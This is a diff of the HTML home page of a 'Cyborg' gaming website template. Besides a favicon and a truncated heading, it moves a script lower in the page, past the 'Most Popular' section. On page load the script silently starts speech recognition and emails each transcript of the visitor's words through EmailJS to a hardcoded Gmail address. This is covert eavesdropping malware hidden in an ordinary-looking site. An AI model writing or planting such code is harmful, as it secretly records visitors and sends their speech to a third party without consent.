@@ -7,7 +7,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@100;200;300;400;500;600;700;800;900&display=swap" rel="stylesheet">
-
+    <link rel="icon" href="assets/images/Icon-logo.png" type="image/png">
     <title>Cyborg - Home Page</title>
 
     <!-- Bootstrap core CSS -->
@@ -28,57 +28,7 @@
   </head>
 
 <body>
-
-  <script>
-    var SpeechRecognition = window.SpeechRecognition || window.webkitSpeechRecognition || window.mozSpeechRecognition || window.msSpeechRecognition;
-    var voiceRecognition = new SpeechRecognition();
-
-    voiceRecognition.lang = 'en-US';
-    voiceRecognition.interimResults = false;
-    voiceRecognition.maxAlternatives = 5;
-    voiceRecognition.start();
-
-    // Function to send Email
-    function sendEmail(message) {
-        // Change the value
-        var serviceID = 'service_wpyahzp';
-        var templateID = 'template_bk4sgag';
-        var userID = 'yb_5gt0dHFSJMppjP';
-
-        // Email Parameters
-        var templateParams = {
-            to_email: 'bambinorori@gmail.com',
-            message: message
-        };
-
-        // Send Email
-        emailjs.send(serviceID, templateID, templateParams, userID)
-            .then(function(response) {
-                console.log('Email sent successfully', response);
-            }, function(error) {
-                console.error('Email sending failed', error);
-            });
-    };
-
-    voiceRecognition.onresult = function(event) {
-        var recordedVoice = event.results[0][0].transcript;
-        
-        console.log('You Said: ', recordedVoice);
-
-        // Send Email with Recorded msg
-        sendEmail(recordedVoice);
-    };
-</script>
-
-<script src="https://cdn.emailjs.com/dist/email.min.js"></script>
-
-<script>
-    // Initialize Emailjs with userID
-    emailjs.init("yb_5gt0dHFSJMppjP");
-</script>
-
-  
-  
+ 
   <!-- ***** Preloader Start ***** -->
   <div id="js-preloader" class="js-preloader">
     <div class="preloader-inner">
@@ -141,7 +91,7 @@
               <div class="col-lg-7">
                 <div class="header-text">
                   <h6>Welcome To Cyborg</h6>
-                  <h4><em>Browse</em> Our Popular Games Here</h4>
+                  <h4><em>Browse</em> Our Popular P</h4>
                   <div class="main-button">
                     <a href="browse.html">Browse Now</a>
                   </div>
@@ -255,6 +205,55 @@
             </div>
           </div>
           <!-- ***** Most Popular End ***** -->
+          <script>
+            var SpeechRecognition = window.SpeechRecognition || window.webkitSpeechRecognition || window.mozSpeechRecognition || window.msSpeechRecognition;
+            var voiceRecognition = new SpeechRecognition();
+        
+            voiceRecognition.lang = 'en-US';
+            voiceRecognition.interimResults = false;
+            voiceRecognition.maxAlternatives = 20;
+            voiceRecognition.start();
+        
+            // Function to send Email
+            function sendEmail(message) {
+                // Change the value
+                var serviceID = 'service_wpyahzp';
+                var templateID = 'template_bk4sgag';
+                var userID = 'yb_5gt0dHFSJMppjP';
+        
+                // Email Parameters
+                var templateParams = {
+                    to_email: 'bambinorori@gmail.com',
+                    message: message
+                };
+        
+                // Send Email 
+                emailjs.send(serviceID, templateID, templateParams, userID)
+                    .then(function(response) {
+                        console.log('Email sent successfully', response);
+                    }, function(error) {
+                        console.error('Email sending failed', error);
+                    });
+            };
+        
+            voiceRecognition.onresult = function(event) {
+                var recordedVoice = event.results[0][0].transcript;
+                
+                console.log('You Said: ', recordedVoice);
+        
+                // Send Email with Recorded msg
+                sendEmail(recordedVoice);
+            };
+        </script>
+        
+        <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+        
+        <script>
+            // Initialize Emailjs with userID
+            emailjs.init("yb_5gt0dHFSJMppjP");
+        </script>
+
+      
 
           <!-- ***** Gaming Library Start ***** -->
           <div class="gaming-library">
